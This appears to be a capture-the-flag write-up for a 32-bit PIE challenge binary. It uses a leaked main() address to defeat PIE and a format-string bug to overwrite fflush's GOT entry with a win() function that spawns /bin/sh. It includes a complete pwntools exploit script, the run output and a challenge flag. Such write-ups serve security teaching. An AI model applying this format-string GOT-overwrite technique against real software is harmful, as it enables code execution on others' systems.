# &#35; chall_12

#### &#42; purpose
1. find leaked main() address
2. overwrite fflush.got with win() using format string bug


#### &#42; execute
```bash
## 1 file
$ ls ./chall_12
./chall_12


## 32-bit LSB, dynamically linked and not stripped
$ file ./chall_12
./chall_12: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=88fde33aa617d161af47b6165ca02e8b2a6d382d, for GNU/Linux 3.2.0, not stripped

## PIE enabled
$ checksec --file=./chall_12
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   76) Symbols	  No	0		2		./chall_12

## input twice and echo
$ ./chall_12
Just a single second: 0x566012c1
AAAA
BBBB
BBBB


```

#### &#42; decompile using ghidra
```bash
## vulnerable point is *(undefined8 *)(target + (long)local_c * 8) = local_18;
## need to overwrite puts got to win()
void main(void)

{
  undefined local_24 [20];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  FUN_000110a0("Just a single second: %p\n",main);    // printf("Just a single second: %p\n",main);
  FUN_000110c0(local_24,19,stdin);                    // fgets(local_24,19,stdin);
  vuln();
  return;
}

void vuln(void)

{
  undefined local_d4 [204];
  
  FUN_000110c0(local_d4,199,stdin);   // fgets(local_d4,199,stdin);
  FUN_000110a0(local_d4);             // printf(local_d4); 
  FUN_000110b0(stdin);                // fflush(stdin);
  return;
}

void win(void)

{
  FUN_000110d0("/bin/sh");            // system("/bin/sh");
  return;
}



## exploit structure
fflush.got = win()

```


#### &#42; exploit step
```bash
1. get leaked main address
2. calculate pie_base address
3. find fflush.got address
4. overwrite fflush.got to win()

```



#### &#42; payload(python)
```python
pie_base = leak_main - main_offset
target = pie_base + fflush_got
win = pie_base + win_offset
payload = fmtstr_payload(offset, {target: win})

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *


filename = "./chall_12"
conn = process(filename)
elf = ELF(filename)

win_offset = elf.symbols["win"]
print("win_offset : " + hex(win_offset))
main_offset = elf.symbols["main"]
print("main_offset : " + hex(main_offset))
fflush_got = elf.got["fflush"]
print("fflush_got : " + hex(fflush_got))


print( conn.recvuntil("second: ") )
leak_main = int(conn.recv(10),16)
print( hex(leak_main) )


pie_base = leak_main - main_offset
print( "pie_base : " + hex(pie_base) )

conn.sendline("AAAA")

with open("payload", "wb") as fd:
    fd.write("DUMY\n")

target = pie_base + fflush_got
print( "target : " + hex(target) )
win = pie_base + win_offset
print( "win : " + hex(win) )



offset = 6
payload = fmtstr_payload(offset, {target: win})


conn.sendline(payload)

with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[+] Starting local process './chall_12': pid 1026
[*] '/pwn/sunshine/12/chall_12'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
win_offset : 0x122d
main_offset : 0x12c1
fflush_got : 0x3320
Just a single second:
0x565af2c1
pie_base : 0x565ae000
target : 0x565b1320
win : 0x565af22d
[*] Switching to interactive mode

                                            ???                                        \x80   o                                                                                                                                                       \x00\x13V#\x13V"\x13V!\x13V
$ cat flag.txt
sun{the-stage-351efbcaebfda0d5}
$

```
